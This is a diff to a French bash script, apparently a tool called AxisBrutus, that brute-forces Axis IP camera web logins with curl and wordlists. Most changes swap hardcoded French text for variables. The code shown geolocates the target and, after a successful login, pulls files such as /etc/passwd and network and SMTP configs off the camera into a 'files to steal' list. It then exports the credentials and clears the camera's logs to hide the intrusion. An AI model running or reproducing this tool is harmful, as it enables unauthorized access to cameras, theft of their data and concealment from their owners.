+			echo -e "$col_titre$puce_level_2$element_testco_ignore_skip:$col_erreur $element_testco_ignore_skip_value"
+			logMessage "$logs_testco_ignore" "$logs_type_error"
+			
+		fi
 	fi
+else
+	echo -e "$col_titre$puce_level_1$element_testco_ignore :$col_texte $vocab_parameter --ignore"
 fi
 ####################################################################################################################
 #                                                       ANALYSE
 ####################################################################################################################
-echo -e "$jaune_fonce\n$souligne"'ANALYSE:'$reset
+echo -e "$col_section\n$souligne$section_analyse:$reset"
 
 #Informations sur la cibles
-echo -en "$jaune[+] Modeles testés :$cyan"
-echo -e "$cyan"${#liste_modeles_verifies[*]}"$cyan au total. $cyan_fonce(--list pour lister les modeles testés)"
+echo -en "$col_titre$puce_level_1$element_analyse_mod_tested :$col_texte"
+echo -e "$col_texte"${#liste_modeles_verifies[*]}"$col_texte $vocab_intotal. $col_remarque($element_analyse_mod_detect_listhelp)"
 
 
 #detection du modele  && [ "$checkOnly" != "OUI" ] 
 if [ "$skipModeleDetect" = "OUI" ];then
-	echo -e "$jaune[+] Detection du modele non effectuée car l'argument --skip (-s) a été passé! $cyan"
-	logMessage "Detection du modèle : Désactivée" "ATTENTION" 
+	echo -e "$col_titre$puce_level_1$element_analyse_mod_test_igonre $col_texte"
+	logMessage "$element_analyse_mod_detect : $vocab_disabled" "$logs_type_warning" 
 	modele_complet=$modele_nondetecte
 else
-	echo -e "$jaune[+] Detection du modele de la camera en cours...$cyan"
-	logMessage "Detection du modele de la camera" "INFORMATION" 
+	echo -e "$col_titre$puce_level_1$element_analyse_mod_detect : $col_texte $vocab_running"
+	logMessage "$element_analyse_mod_detect" "$logs_type_info" 
 	#modele=$(modeleExtract $modele_complet) # resultats erronés : diag a faire
-	echo -en "$jaune |_[-] Connexion en cours...$cyan"
+	echo -e "$col_titre$puce_level_2$vocab_connection : $col_texte$vocab_running"
 	x_modele_complet=$(fullModeleDetect $ip)
 	modele=$(echo $x_modele_complet|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
 	modele=${modele/.*[aA][xX][iI][sS]/axis}
-	echo -e "$cyan terminé!\n"
+	tput cuu1;tput el
+	echo -e "$col_titre$puce_level_2$vocab_connection : $col_texte$vocab_finished"
 	#echo -e $magenta$x_modele_complet
 	if [ "$modele_complet" != "$modele_nondetecte" ]; then
 		no_modele_recherche=0
 		for mod in ${liste_modeles_verifies[*]}; do
 			no_modele_recherche=$(( $no_modele_recherche+1 ))
-			echox "$jaune |_[-] Détection en cours: "$(afficherBarre $no_modele_recherche ${#liste_modeles_verifies[*]} )""
+			echox "$col_titre$puce_level_2$element_analyse_mod_detect_running: "$(afficherBarre $no_modele_recherche ${#liste_modeles_verifies[*]} )""
 			if [ "$mod" = "$modele" ];then
 				modeles_verifie="OUI"
 				break
 			fi
 		done
-		echox "$jaune |_[-] Détection en cours:$cyan Terminée!"
+		echox "$col_titre$puce_level_2$element_analyse_mod_detect_running:$col_texte $vocab_finished"
 		
 
 		if [ "$modeles_verifie" = "OUI" ];then
-			echo -e "$jaune |_[-] Modele:$cyan $modele $vert(testé et vérifié!) $jaune_fonce;)"
+			echo -e "$col_titre$puce_level_2$vocab_model:$col_texte $modele $col_remarque(""$col_succes""$element_analyse_mod_detect_tested$col_remarque) $col_section$smiley_smile"
 		else
-			echo -e "$jaune |_[-] Modele:$cyan $modele $rouge(non testé!) $jaune_fonce:/"
+			echo -e "$col_titre$puce_level_2$vocab_model:$col_texte $modele $col_remarque(""$col_erreur""$element_analyse_mod_detect__nontested$col_remarque) $col_section$smiley_interrogation"
 		fi
 	else
-		echo -e "$magenta Le modele n'a pas été reconnu! $jaune_fonce:/"
+		echo -e "$magenta $err_modele_inconnu $col_section$smiley_sad"
 	fi
 
-	echo -en "$jaune[+] Detection de la version du firmware...$cyan"
+	echo -en "$col_titre$puce_level_2"$element_analyse_mod_detect_firmware" :$col_texte"
 	#version=$(versionDetect $modele_complet) #pb resultats erronés
 	version=$(echo $modele_complet|rev|cut -d " " -f 1|rev)
 	if [ "$version" != "N/A" ]; then
 		version=$(echo $modele_complet|egrep -o [0-9.,].*)
 	fi
-	echo -e "$cyan terminé!"
+	echo -e "$col_texte $vocab_finished\n"
 
 fi
 
 
-echo -en "$jaune[+] Cherche une URL à attaquer...$cyan"
+echo -en "$col_titre$puce_level_1$element_analyse_url_search...$col_texte"
 if [ "$urlforced" != "OUI" ]; then 
 	url=$(urlModele $ip $modele)
 	if [ "$checkOnly" != "OUI" ];then
-		logMessage "Recherche URL à attaquer" "INFORMATION" 
+		logMessage "$element_analyse_url_search" "$logs_type_info" 
 	fi
 fi
-echo -e "$cyan terminé!"
+echo -e "$col_texte $vocab_finished!"
 
 
 #La geolocalisation
 if [ "$skipGeo" != "OUI" ];then
-	echo -en "$jaune[+] Geolocalisation de la cible...$cyan"
+	echo -en "$col_titre$puce_level_1"$element_analyse_geolocate" : $col_texte"
 	infosGeo_save=$(infosGeolocalisation $ip)
 	infosGeo=$infosGeo_save
 	infosGeoExport=$infosGeo_save
 	if [ "$checkOnly" != "OUI" ];then
-		logMessage "Geolocalisation" "INFORMATION" 
+		logMessage "$element_analyse_geolocate" "$logs_type_info" 
 	fi
-	echo -e "$cyan terminé!"
+	echo -e "$col_texte $vocab_finished"
 else
 	if [ "$checkOnly" != "OUI" ];then
-		logMessage "Geolocalisation" "INFORMATION" 
+		logMessage "$element_analyse_geolocate" "$logs_type_info" 
 	fi
 fi
+if [ "$checkOnly" != "OUI" ];then
+
+	#prepas vars env et mise en forme 
+	echo -en "$col_titre$puce_level_1"$element_prep_env:$col_texte": "
+
+	infosGeo=${infosGeo//':'/":$col_texte"}
+	infosGeo=${infosGeo//','/"\n$col_titre |_[-]"}
+	echo -e "$col_texte $vocab_finished"
+fi
+
+####################################################################################################################
+#                                                       INFORMATIONS
+####################################################################################################################
+echo -e "$col_section\n$souligne$section_informations:$reset"
+
+echo -e "$col_titre$puce_level_1""IP:$col_texte $ip"
+echo -en "$col_titre$puce_level_1$vocab_model:$col_texte $modele"
+if [ ${#version} -gt 0 ]; then 
+	echo -en "$col_texte ($element_info_firmware $magenta$version$col_texte)"
+else
+	echo -en "$col_texte "
+fi
+
+
+if [ "$checkOnly" = "OUI" ];then
+	logMessage "$vocab_model: $modele" "$logs_type_info" 
+	logMessage "$vocab_firmware: $version" "$logs_type_info" 
+fi
+
+if [ "$modeles_verifie" = "OUI" ]; then 
+	echo -e $col_texte" $col_remarque($col_succes$vocab_model $vocab_known$col_remarque)"
+	logMessage "$logs_modele_compatible_ok" "$logs_type_info" 
+else
+	echo -e $col_remarque"($col_erreur$vocab_model $vocab_unknown$col_remarque)"
+	logMessage "$logs_modele_compatible_echec" "$logs_type_warning" 
+fi
+
+echo -e "$col_titre$puce_level_1$element_info_url_cible:$col_texte $url"
+
+
 if [ "$checkOnly" != "OUI" ];then
 	#export...
 	ip4file=${ip/:/-PORT_}
 	fichier_mdp_trouve=${fichier_mdp_trouve/~MODELE~/$modele}
 	fichier_mdp_trouve=${fichier_mdp_trouve/~IP~/$ip4file}
 	if [ "$fichier_mdp_trouve" != "$fichier_mdp_trouve_default" ];then
-		echo -e "$jaune[+] Fichier export:$cyan $fichier_mdp_trouve $jaune"
+		echo -e "$col_titre$puce_level_1$element_info_fic_export:$col_texte $fichier_mdp_trouve $col_titre"
 	fi
-
-	#prepas vars env et mise en forme 
-	echo -en "$jaune[+] Préparation de l'environnement...$cyan"
-
-	infosGeo=${infosGeo//':'/":$cyan"}
-	infosGeo=${infosGeo//','/"\n$jaune |_[-]"}
-	echo -e "$cyan terminé!"
 fi
-
-####################################################################################################################
-#                                                       INFORMATIONS
-####################################################################################################################
-echo -e "$jaune_fonce\n$souligne"'INFORMATIONS:'$reset
-
-echo -e "$jaune[+] IP:$cyan $ip"
-echo -en "$jaune[+] Modele:$cyan $modele"
-if [ ${#version} -gt 0 ]; then 
-	echo -en "$cyan (Firmware ver. $magenta$version$cyan)"
-else
-	echo -en "$cyan "
-fi
-
-
-if [ "$checkOnly" = "OUI" ];then
-	logMessage "Modele: $modele" "INFORMATION" 
-	logMessage "Firmware: $version" "INFORMATION" 
-fi
-
-if [ "$modeles_verifie" = "OUI" ]; then 
-	echo -e $cyan" ("$vert"modele reconnu"$cyan")"
-	logMessage "Compatibilité: Modele verifié!" "INFORMATION" 
-else
-	echo -e $cyan" ("$rouge"modele non verifié"$cyan")"
-	logMessage "Compatibilité: Modele non testé!" "INFORMATION" 
-fi
-
-echo -e "$jaune[+] URL Cible generée:$cyan $url"
-
-
 
 if [ "$skipGeo" != "OUI" ];then
-	if [ ${#infosGeo} -eq 0 ]; then infosGeo="Pas d'informations disponibles" ;fi
-	echo -e "$jaune[+] Geolocalisation :"
-	echo -en "$jaune |_[-] "$infosGeo""
+	if [ ${#infosGeo} -eq 0 ]; then 
+		infosGeo="$element_info_geo_nothing $smiley_sad"
+	fi
+	echo -e "$col_titre$puce_level_1$element_param_geolocalisation :"
+	echo -en "$col_titre$puce_level_2"$infosGeo""
 fi
-echo -e "$jaune"
+echo -e "$col_titre"
 
 
 
@@ -930,9 +917,9 @@ echo -e "$jaune"
 
 if [ "$checkOnly" != "OUI" ];then
 
-	echo -e "$jaune_fonce\n$souligne"'TRAITEMENT:'$reset
+	echo -e "$col_section\n$souligne$section_attack:$reset"
 
-	logMessage "Attaque en cours" "INFORMATION"
+	logMessage "Attaque en cours" "$logs_type_info"
 	 
 	progression_pourcent=0
 	while read user; do 
@@ -948,9 +935,9 @@ if [ "$checkOnly" != "OUI" ];then
 
 			
 			#avancement:
-			ligne_a_afficher="$jaune[$bleu_fonce$ip$jaune] [$magenta$total_fait_txt$jaune/$magenta_fonce$nb_combinaisons$jaune] [$vert_fonce$progression_pourcent_txt%$jaune] $user $jaune_fonce&$jaune $mdp : "
+			ligne_a_afficher="$col_titre[$bleu_fonce$ip$col_titre] [$magenta$total_fait_txt$col_titre/$magenta_fonce$nb_combinaisons$col_titre] [$col_script$progression_pourcent_txt%$col_titre] $user $col_section&$col_titre $mdp : "
 			#echo -en "$ligne_a_afficher"
-			echo -en "$jaune[+] Attaque $jaune_fonce$jaune$ip: "$(afficherBarre "$total_fait" "$nb_combinaisons")"$jaune [$cyan$user$jaune:$cyan$mdp$jaune] "
+			echo -en "$col_titre$puce_level_1$element_attack $col_section$col_titre$ip: "$(afficherBarre "$total_fait" "$nb_combinaisons")"$col_titre [$col_texte$user$col_titre:$col_texte$mdp$col_titre] "
 			
 			#Requete HTTP
 			/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime -k -s "$url" --user "$user:$mdp"  -o $tmp	
@@ -975,22 +962,22 @@ if [ "$checkOnly" != "OUI" ];then
 
 			#si le titre contien "unhotorized"
 			if [ ${#test_unauthorized} -gt 0 ];then
-				echo -e $rouge$msg_echec
+				echo -e $col_erreur$msg_echec
 			else			
 				#sinon on a administration dans le titre de la page alors considere qu'on a passé la porte :D
 				if [ ${#test_administration} -gt 0 ] || [ ${#test_configuration} -gt 0 ];then
-					echo -e $vert$msg_succes
+					echo -e $col_succes$msg_succes
 					mdp_trouve='OUI'
 					break
 				else					
 					#si pas de titre administration mais la page contient "enable javascript"
 					if [ ${#test_javascript} -gt 0 ];then					
 						if [ ${#test_presence_lien_admin} -gt 0 ];then
-							echo -e $vert$msg_succes
+							echo -e $col_succes$msg_succes
 							mdp_trouve='OUI'
 							break
 						else
-							echo -e "$rouge$msg_echec: Necessite Javascript. Verifiez cette combinaison manuellement pour vérifier svp"
+							echo -e "$col_erreur$msg_echec: $err_javascript_required"
 							echec_js="OUI"
 							#echo -e $bleu;cat $tmp;echo -e $reset
 							#break
@@ -1001,12 +988,12 @@ if [ "$checkOnly" != "OUI" ];then
 						#si page 404
 						if [ ${#test_page400} -gt 0 ] || [ ${#test_page404} -gt 0 ] || [ ${#test_page500} -gt 0 ];then
 														
-							echo -e "$rouge$msg_echec: Page introuvable. Forcez l'URL avec l'argument \"--url /admin/users.shtml\" $jaune_fonce:/"
+							echo -e "$col_erreur$msg_echec: $err_javascript_url_notfound $col_section$smiley_interrogation"
 							echec_404="OUI"
 							break
 						#sinon ok?
 						else				
-							echo -e $vert$msg_succes
+							echo -e $col_succes$msg_succes
 							mdp_trouve="OUI"
 							break
 						fi
@@ -1046,25 +1033,29 @@ duree_totale=$(/bin/date -d @$heure_duree_totale +%H:%M:%S)
 
 if [ "$checkOnly" != "OUI" ] ; then
 	if [ "$mdp_trouve" = "OUI" ] ; then
-		message_fin="Le mot-de-passe a été trouvé en "$top_timer"s après $total_fait tentatives. "
-
-		#echo -e "$jaune |_[-] Succes: $cyan$message_fin"
-		tput cuu1;tput el;echo -e "$jaune[+] Attaque $ip:$vert Succes!$cyan $message_fin"
-		echo -e "$jaune |_[-] Login: $user"
-		echo -e "$jaune |_[-] Mot-de-passe: $mdp"
-		echo -e $vert
+		message_fin="$element_attack_finished_succes"
+		#Le mot-de-passe a été trouvé en "$top_timer"s après $total_fait tentatives. 
+		message_fin=${message_fin//"__TOTALTIME__"/"$top_timer"}
+		message_fin=${message_fin//"__TOTALCOMBI__"/"$total_fait"}
+		#echo -e "$col_titre$puce_level_2""Succes: $col_texte$message_fin"
+		tput cuu1;tput el;echo -e "$col_titre$puce_level_1$element_attack $ip:$col_succes $vocab_succes$col_texte $message_fin"
+		echo -e "$col_titre$puce_level_2$vocab_login: $user"
+		echo -e "$col_titre$puce_level_2$vocab_password: $mdp"
+		echo -e $col_succes
 		echo -e $banniere_bravo|base64 -d
 		echo -e $ab_slogan_bravo
 		echo -e $reset
-		logMessage "$message_fin" "P4WN3D!!!"
+		logMessage "$message_fin" "$logs_type_pawned"
 	else
-		message_fin="Le mot-de-passe n'a pas été trouvé apres $total_fait combinaisons, soit "$top_timer"s d'attaque!" 
-		echo -e "$jaune[+] Attaque $ip: $cyan$message_fin"
-		echo -e $rouge
+		message_fin="$element_attack_finished_echec" 
+		message_fin=${message_fin//"__TOTALTIME__"/"$top_timer"}
+		message_fin=${message_fin//"__TOTALCOMBI__"/"$total_fait"}
+		echo -e "$col_titre$puce_level_1$element_attack $ip: $col_texte$message_fin"
+		echo -e $col_erreur
 		echo -e $banniere_tryagain|base64 -d
 		echo -e $ab_slogan_defaite
 		echo -e $reset
-		logMessage "$message_fin" "DOMMAGE!!!"
+		logMessage "$message_fin" "$logs_type_notpawned"
 	fi
 fi
 ####################################################################################################################
@@ -1072,14 +1063,14 @@ fi
 ####################################################################################################################
 
 if [ "$mdp_trouve" = "OUI" ]; then
-	echo -e "$jaune_fonce\n$souligne""SYNTHESE DES DONNEES POUR l'EXPORT:"$reset
-	echo -en "$jaune[+] En cours..."
+	echo -e "$col_section\n$souligne$section_synthese:$reset"
+	echo -en "$col_titre$puce_level_1$vocab_running..."
 	
-	export_donnes='INFORMATIONS IDENTIFICATION:'
-	export_donnes=$export_donnes"\n - LOGIN: $user"
-	export_donnes=$export_donnes"\n - MOT-DE-PASSE: $mdp"
+	export_donnes="$export_title_creds:"
+	export_donnes=$export_donnes"\n - $vocab_login: $user"
+	export_donnes=$export_donnes"\n - $vocab_password: $mdp"
 
-	export_donnes=$export_donnes'\n\nINFORMATIONS CAMERA:'
+	export_donnes=$export_donnes"\n\n$export_title_cam:"
 	if [ "$exportforced" = "OUI" ];then
 		export_destination="$fichier_mdp_trouve"
 	else
@@ -1088,43 +1079,43 @@ if [ "$mdp_trouve" = "OUI" ]; then
 	fi
 
 	export_donnes=$export_donnes"\n - IP: $ip"
-	export_donnes=$export_donnes"\n - Modele: $modele"
+	export_donnes=$export_donnes"\n - $vocab_model: $modele"
 
 	if [ ${#version} -gt 0 ]; then 
-		export_donnes=$export_donnes" (Firmware ver. $version)"
+		export_donnes=$export_donnes" ($element_info_firmware $version)"
 	else
 		export_donnes=$export_donnes""
 	fi
 	if [ "$modeles_verifie" = "OUI" ]; then 
-		export_donnes=$export_donnes" (modele reconnu)"
+		export_donnes=$export_donnes" ($vocab_model:$vocab_known)"
 	else
-		export_donnes=$export_donnes" (modele non verifié)"
+		export_donnes=$export_donnes" ($vocab_model:$vocab_unknown)"
 	fi
 
-	export_donnes=$export_donnes"\n - URL Cible generée: $url"
+	export_donnes=$export_donnes"\n - $element_info_url_cible: $url"
 	if [ "$skipGeo" != "OUI" ];then
-		if [ ${#infosGeoExport} -eq 0 ]; then infosGeoExport="Pas d'informations disponibles" ;fi
-		export_donnes=$export_donnes"\n - Geolocalisation :\n\t- "
+		if [ ${#infosGeoExport} -eq 0 ]; then infosGeoExport="$element_info_geo_nothing" ;fi
+		export_donnes=$export_donnes"\n - $element_param_geolocalisation :\n\t- "
 		#infosGeo=${infosGeoExport//':'/":"}
 		export_donnes=$export_donnes" "${infosGeoExport//','/"\n\t- "}""
 	fi
 
-	export_donnes=$export_donnes'\n\nINFORMATIONS ATTAQUE:'
-	export_donnes=$export_donnes"\n - Date: "$(/bin/date "+%c")
-	export_donnes=$export_donnes"\n - Durée: "$duree_totale
-	export_donnes=$export_donnes"\n - Départ de l'attaque: "$(/bin/date -d @$heure_depart )
-	export_donnes=$export_donnes"\n - Nombre tentatives: "$total_fait" sur un total de "$nb_combinaisons
-	export_donnes=$export_donnes"\n - Fin de l'attaque: "$(/bin/date -d @$heure_fin )
-	export_donnes=$export_donnes"\n - Fichier usernames utilisé: "$users_wordlist" ($nb_users usernames)"
-	export_donnes=$export_donnes"\n - Fichier mot-de-passe utilisé: "$mdp_wordlist" ($nb_mdp mot-de-passe)"
+	export_donnes=$export_donnes"\n\n$export_title_attack:"
+	export_donnes=$export_donnes"\n - $vocab_date: "$(/bin/date "+%c")
+	export_donnes=$export_donnes"\n - $element_resume_duration: "$duree_totale
+	export_donnes=$export_donnes"\n - $export_start: "$(/bin/date -d @$heure_depart )
+	export_donnes=$export_donnes"\n - $export_nbtry: $total_fait $export_total $nb_combinaisons"
+	export_donnes=$export_donnes"\n - $export_end: "$(/bin/date -d @$heure_fin )
+	export_donnes=$export_donnes"\n - $logs_fic_usernames: "$users_wordlist" ($nb_users $vocab_login""s)"
+	export_donnes=$export_donnes"\n - $logs_fic_mdp: "$mdp_wordlist" ($nb_mdp $vocab_password""s)"
 	if [ "$skipModeleDetect" = 'OUI' ];then
-		export_donnes=$export_donnes"\n - La détection du modèle a été ignorée : L'argument \"--skip\" (ou équivalent) a été passé."
+		export_donnes=$export_donnes"\n - $export_detection_ignored"
 	fi
 	if [ "$skipGeo" = 'OUI' ];then
-		export_donnes=$export_donnes"\n - La géolocalisation a été ignorée : L'argument \"--no-geo\" (ou équivalent) a été passé."
+		export_donnes=$export_donnes"\n - $export_geo_ignored"
 	fi
 
-	echo -e "$cyan terminé!"
+	echo -e "$col_texte $vocab_finished"
 fi
 
 ####################################################################################################################
@@ -1132,14 +1123,13 @@ fi
 ####################################################################################################################
 
 if [ "$mdp_trouve" = "OUI" ]; then
-	echo -e "$jaune_fonce\n$souligne"'TELECHARGEMENT DE FICHIERS:\n'$reset
+	echo -e "$col_section\n$souligne$section_telechargement:\n$reset"
 	fichiers_a_voler=('/etc/passwd' '/etc/group' '/etc/applications/config_cam1' '/etc/network/network.conf' '/etc/resolv.conf' '/etc/sftpd.banner' '/var/log/messages' '/var/log/messages.old' '/etc/sysconfig/id.conf' '/etc/sysconfig/appwiz.conf' '/etc/sysconfig/systime.conf' '/etc/sysconfig/isp.conf' '/etc/sysconfig/brand.conf' '/etc/sysconfig/smtp.conf' '/etc/sysconfig/image.conf' '/etc/sysconfig/dst.conf' '/etc/sysconfig/layout.conf' '/etc/httpd/conf/boa.conf' '/etc/pwdb.conf' )
 	nb_fichiers_a_voler=${#fichiers_a_voler[@]}
 	no_fichier=0
-	temp_vole='/tmp/export_vole.txt'
 
-	export_donnes=$export_donnes'\n\nFICHIERS:'
-	logMessage "Telechargement des fichiers" "INFORMATION" 
+	export_donnes=$export_donnes'\n\n:'$vocab_files
+	logMessage "$logs_dl_fic" "$logs_type_info" 
 	for fichier_x in ${fichiers_a_voler[*]}; do
 		no_fichier=$(( $no_fichier+1 ))
 		#logMessage "Telechargement : $fichier_x" "INFORMATION" 
@@ -1149,26 +1139,25 @@ if [ "$mdp_trouve" = "OUI" ]; then
 		fi
 		
 		#affichage a l'ecran
-		echo -e "$jaune[+] Fichier: "$(afficherBarre "$no_fichier" "$nb_fichiers_a_voler")"$jaune [$cyan$fichier_x$jaune]"
+		echo -e "$col_titre$puce_level_1$vocab_files: "$(afficherBarre "$no_fichier" "$nb_fichiers_a_voler")"$col_titre [$col_texte$fichier_x$col_titre]"
 		voleFichier $ip $fichier_x > $temp_vole
-		#echo -e "$jaune[+] FICHIER:$cyan $fichier_x:"
 		if [ "$modeVerbose" = 'OUI' ]; then
-			echo -e "$vert--------------------------------------------------------------$italic$vert_fonce"
+			echo -e "$col_succes$separateur_fichiers$italic$col_script"
 			cat $temp_vole
-			echo -e "$vert--------------------------------------------------------------$reset"
+			echo -e "$col_succes$separateur_fichiers$reset"
 		fi
 		#export
 		export_donnes=$export_donnes"\n$fichier_x:"
-		export_donnes=$export_donnes"\n--------------------------------------------------------------"
+		export_donnes=$export_donnes"\n$separateur_fichiers"
 		while read ligne_fic; do
 			export_donnes=$export_donnes"\n"$ligne_fic""
 		done < $temp_vole
-		export_donnes=$export_donnes"\n--------------------------------------------------------------\n\n"
+		export_donnes=$export_donnes"\n$separateur_fichiers\n\n"
 
 	done;
 
 	tput cuu1;tput el
-	echo -e "$jaune[+] Fichier:$cyan Terminé!"
+	echo -e "$col_titre$puce_level_1$element_dl_finished:$col_texte $vocab_finished"
 		
 
 	echo -e "$reset"
@@ -1178,36 +1167,37 @@ fi
 #                                            EXPORT DES DONNES
 ####################################################################################################################
 if [ "$mdp_trouve" = "OUI" ]; then
-	echo -e "$jaune_fonce\n$souligne"'SAUVEGARDE/EXPORT:'$reset
-	logMessage "Export des données : $export_destination" "INFORMATION"
-	echo -en "$jaune[+] En cours..."
+	echo -e "$col_section\n$souligne$section_savegarde:$reset"
+	logMessage "$element_exporting : $export_destination" "$logs_type_info"
+	echo -en "$col_titre$puce_level_1$vocab_running..."
 
 	echo -e $banniere_export|base64 -d > $export_destination
 	echo -e " $ab_web\t \t AxisBrutus Ver. $ab_ver" >> $export_destination
-	echo -e "-------------------------------------------------------------------------------" >> $export_destination
+	echo -e "$separateur_logs" >> $export_destination
 	echo -e "\n$export_donnes" >> $export_destination
-	echo -e "-------------------------------------------------------------------------------" >> $export_destination
+	echo -e "$separateur_logs" >> $export_destination
 	echo -e " $ab_auteur  -  $ab_contact  -  $ab_web" >> $export_destination
-	echo -e "$cyan terminé!"
+	echo -e "$col_texte $vocab_finished!"
 fi
 ####################################################################################################################
 #                                                      RESUME
 ####################################################################################################################
 if [ "$checkOnly" != "OUI" ]; then
-	echo -e "$jaune_fonce\n$souligne"'RESUME:'$reset
+	echo -e "$col_section\n$souligne$section_resume:$reset"
 	if [ "$mdp_trouve" = "OUI" ]; then
-		echo -e "$jaune[+] BRAVO:$cyan On l'a trouvé en $vert$total_fait$cyan essais!"
-		echo -e "$jaune[+] EXPORT:$cyan Les informations d'identification ont été stockées ici : $vert$export_destination"
+		echo -e "$col_titre$puce_level_1$element_resume_bravo:$col_texte "${element_resume_succes//"__TOTALCOMBI__"/"$col_succes$total_fait$col_texte"}
+		#On l'a trouvé en $col_succes$total_fait$col_texte essais!
+		echo -e "$col_titre$puce_level_1$element_resume_echec:$col_texte $element_resume_export : $col_succes$export_destination"
 	else
 			if [ "$echec_js" = "OUI" ]; then		
-				echo -e "$jaune[+] M****:$cyan Cette interface web axis nécessite javascript. $jaune_fonce:'("
-				echo -e "$jaune[+] INFO:$cyan Version javascript en cours de dev $jaune_fonce;)"
+				echo -e "$col_titre$puce_level_1$element_resume_fail:$col_texte $err_javascript_resume. $col_section$smiley_sad"
+				echo -e "$col_titre$puce_level_1$element_resume_info:$col_texte $err_javascript_info $col_section$smiley_smile"
 			else
-				echo -e "$jaune[+] M****:$cyan $total_fait essais sans trouver $jaune_fonce:'("
-				echo -e "$jaune[+] ASTUCE:$cyan Ajoute des logins et des mdp aux fichiers wordlist $jaune_fonce;)"
+				echo -e "$col_titre$puce_level_1$element_resume_fail:$col_texte $total_fait $err_tries_without_succes $col_section$smiley_sad"
+				echo -e "$col_titre$puce_level_1$element_resume_astuce:$col_texte $msg_astuce_noresult $col_section $smiley_smart"
 			fi
 	fi
-	echo -e "$jaune[+] DUREE:$cyan $duree_totale"
+	echo -e "$col_titre$puce_level_1$element_resume_duration:$col_texte $duree_totale"
 fi
 
 
@@ -1216,19 +1206,19 @@ fi
 ####################################################################################################################
 
 if [ "$mdp_trouve" = "OUI" ]; then
-	echo -e "$jaune_fonce\n$souligne"'EFFACER LES TRACES/LOGS:'$reset
-	logMessage "Effacement des logs" "INFORMATION"
-	echo -en "$jaune[+] En cours..."
+	echo -e "$col_section\n$souligne$section_eraseLogs:$reset"
+	logMessage "$logs_eraselogs" "$logs_type_info"
+	echo -en "$col_titre$puce_level_1$vocab_running..."
 	#effacer les traces 
 	effacerTraces $ip 
 
-	echo -e "$cyan terminé!"
+	echo -e "$col_texte $vocab_finished"
 fi
 ####################################################################################################################
 #                                                        END
 ####################################################################################################################
 
-logMessage "Terminé : Durée $duree_totale" "INFORMATION"
+logMessage "$vocab_finished : $element_resume_duration $duree_totale" "$logs_type_info"
 
 echo -e $reset
 exit
